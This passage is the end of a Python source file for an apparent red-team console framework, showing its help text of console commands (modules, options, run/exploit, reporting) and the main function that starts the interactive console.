  python3 gui.py                          Launch GUI directly
  
{Colors.BLUE}Console Commands:{Colors.END}
  show modules                            List all available modules
  use <module>                            Select a module
  show options                            Display module options
  set <option> <value>                    Set an option value
  run / exploit                           Execute the module
  back                                    Return to main menu
  search <keyword>                        Search for modules
  info <module>                           Show module details
  report add|show|export                  Manage vulnerability findings
  gui                                     Launch GUI from console
  clear                                   Clear screen
  exit / quit                             Exit the framework
""")
        return
    
    # Launch interactive console
    try:
        console = RedTeamConsole()
        console.cmdloop()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[*]{Colors.END} Interrupted by user")
    except Exception as e:
        print(f"\n{Colors.RED}[-]{Colors.END} Error: {e}")

if __name__ == "__main__":
    main()
